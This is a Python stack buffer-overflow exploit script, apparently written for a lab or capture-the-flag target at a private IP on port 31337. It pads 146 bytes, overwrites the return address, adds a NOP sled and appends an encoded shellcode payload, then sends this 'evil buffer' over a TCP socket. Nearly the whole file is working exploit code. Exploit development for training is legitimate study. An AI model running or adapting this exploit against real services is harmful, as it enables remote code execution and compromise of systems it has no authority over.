import socket

ip = "10.10.60.199"	# Change to IP target
port = 31337		# Change to Port target

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xb8\xb2\xf6\xb0\xb6\xd9\xc7\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x59\x83\xea\xfc\x31\x42\x10\x03\x42\x10\x50\x03\x4c"
"\x5e\x1b\xec\xad\x9f\x43\xdc\x7f\x16\x66\x7a\x0b\x7b\x58"
"\x08\x59\x70\x13\x5c\x4a\x03\x51\x49\x43\xec\x9a\x3e\xe9"
"\x34\x95\x80\x42\x04\xb4\x7c\x99\x59\x16\xbc\x52\xac\x57"
"\xf9\x24\xda\xb8\x57\xe0\xaf\x14\x48\x85\xf2\xa4\x69\x49"
"\x79\x94\x11\xec\xbe\x60\xae\xef\xee\x03\x66\xe8\x5e\x98"
"\x2f\x28\x5e\x4d\x4a\xe1\x14\x4d\x1c\x79\xe0\x26\x9f\xab"
"\x38\xc7\x91\x93\xfa\xf8\xdf\xbf\xfc\xc1\xd8\x5f\x8b\x39"
"\x1b\xdd\x8c\xfa\x61\x39\x18\x1c\xc1\xca\xba\xf8\xf3\x1f"
"\x5c\x8b\xf8\xd4\x2a\xd3\x1c\xea\xff\x68\x18\x67\xfe\xbe"
"\xa8\x33\x25\x1a\xf0\xe0\x44\x3b\x5c\x46\x78\x5b\x38\x37"
"\xdc\x10\xab\x2e\x60\xd9\x33\x4f\x3c\x4d\xff\x82\xbf\x8d"
"\x97\x95\xcc\xbf\x38\x0e\x5b\xf3\xb1\x88\x9c\x82\xd6\x2a"
"\x72\x2c\xb6\xd4\x73\x4c\x9e\x12\x27\x1c\x88\xb3\x48\xf7"
"\x48\x3b\x9d\x6d\x43\xab\x14\x60\x2c\xf4\x41\x80\xd2\x1b"
"\xce\x0d\x34\x4b\xbe\x5d\xe9\x2c\x6e\x1d\x59\xc5\x64\x92"
"\x86\xf5\x86\x79\xaf\x9c\x68\xd7\x87\x08\x10\x72\x53\xa8"
"\xdd\xa9\x19\xea\x56\x5b\xdd\xa5\x9e\x2e\xcd\xd2\xf8\xd0"
"\x0d\x23\x6d\xd0\x67\x27\x27\x87\x1f\x25\x1e\xef\xbf\xd6"
"\x75\x6c\xc7\x29\x08\x44\xb3\x1c\x9e\xe8\xab\x60\x4e\xe8"
"\x2b\x37\x04\xe8\x43\xef\x7c\xbb\x76\xf0\xa8\xa8\x2a\x65"
"\x53\x98\x9f\x2e\x3b\x26\xf9\x19\xe4\xd9\x2c\x1a\xe3\x25"
"\xb2\x35\x4c\x4d\x4c\x06\x6c\x8d\x26\x86\x3c\xe5\xbd\xa9"
"\xb3\xc5\x3e\x60\x9c\x4d\xb4\xe5\x6e\xec\xc9\x2f\x2e\xb0"
"\xca\xdc\xeb\x43\xb0\xad\x0c\xa4\x45\xa4\x68\xa5\x45\xc8"
"\x8e\x9a\x93\xf1\xe4\xdd\x27\x46\xf6\x68\x05\xef\x9d\x92"
"\x19\xef\xb7")

buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
